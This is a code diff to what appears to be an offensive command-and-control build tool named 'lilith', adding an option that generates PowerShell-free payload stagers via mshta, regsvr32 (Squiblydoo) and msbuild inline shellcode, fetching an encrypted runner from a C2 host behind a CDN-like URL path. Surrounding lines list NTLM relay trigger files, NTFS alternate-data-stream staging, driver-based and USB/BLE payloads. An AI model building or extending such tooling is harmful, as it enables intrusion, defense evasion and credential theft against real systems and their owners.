@@ -138,6 +138,13 @@ BUILD FLAGS
                           • Feed captures to hashcat/Responder for NTLM relay
     --ntlm-out DIR      Output directory  (default: <workspace>/ntlm_trigger/)
 
+  --lolbin MODE         No-PowerShell stager for PS-blocked environments:
+                          mshta     → .hta file run via mshta.exe (VBScript, XOR obfuscated)
+                          regsvr32  → .sct scriptlet via regsvr32 Squiblydoo (HTTP only)
+                          msbuild   → .xml proj file via msbuild.exe (inline C# shellcode)
+                          all       → generate all three
+                          Each output includes the exact invoke command.
+
   --ads [TOOL]          Stage payload in NTFS ADS + generate offline loader pair:
                           • ads_plant_<hex>.ps1: downloads .enc from C2 via SslStream,
                             writes raw bytes to an ADS of a signed system binary
@@ -751,6 +758,27 @@ def cmd_build(args, cfg, ws):
         build_ntlm_triggers(lhost, ntlm_out)
         did_something = True
 
+    # ── LOLBin stagers (no-PowerShell delivery) ──────────────────────────────
+    if getattr(args, "lolbin", None):
+        runner_dat_name = ws.get_enc_name("__runner_dat__")
+        if not runner_dat_name or not os.path.exists(ws.path(runner_dat_name)):
+            print("[!] Runner not built yet — run: lilith build --runner first")
+            sys.exit(1)
+        sc_enc_name = ws.get_enc_name("__runner_sc_c2__")
+        sc_enc_path = ws.path(sc_enc_name) if sc_enc_name else None
+        from builders.lolbin_stage import build_lolbin_stagers
+        build_lolbin_stagers(
+            mode            = args.lolbin,
+            runner_dat_path = ws.path(runner_dat_name),
+            runner_xor_key  = _read_runner_key(ws),
+            sc_enc_path     = sc_enc_path,
+            out_dir         = ws.directory,
+            lhost           = cfg.get("lhost", "10.10.14.1"),
+            port            = cfg.get("http_port", 8443),
+            url_prefix      = cfg.get("url_prefix", "/cdn/static/v3"),
+        )
+        did_something = True
+
     # ── ADS staging ───────────────────────────────────────────────────────────
     if getattr(args, "ads", None) is not None:
         tname = args.ads or "__c2_agent__"
@@ -777,6 +805,7 @@ def cmd_build(args, cfg, ws):
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
         print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
         print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger, --ads [TOOL],")
+        print("    --lolbin mshta|regsvr32|msbuild|all,")
         print("    --android-ble, --android-payload, --android-ble + --android-payload,")
         print("    or --wasm [--wasm-exe NAME] [--wasm-title TITLE]")
 
@@ -1515,6 +1544,9 @@ def main():
                          help="Generate .url/.scf/.searchConnector NTLM trigger files (auto-auth on folder browse)")
     build_p.add_argument("--ntlm-out",      metavar="DIR",   dest="ntlm_out",     default=None,
                          help="Output directory for NTLM trigger files (default: <workspace>/ntlm_trigger/)")
+    build_p.add_argument("--lolbin",        metavar="MODE",  dest="lolbin",
+                         choices=["mshta", "regsvr32", "msbuild", "all"],
+                         help="No-PowerShell stager: mshta | regsvr32 | msbuild | all")
     build_p.add_argument("--ads",           metavar="TOOL",  dest="ads", nargs="?", const="__c2_agent__",
                          help="Stage payload in NTFS ADS + generate offline loader (default: C2 agent)")
     build_p.add_argument("--ads-host",      metavar="FILE",  dest="ads_host",  default=None,
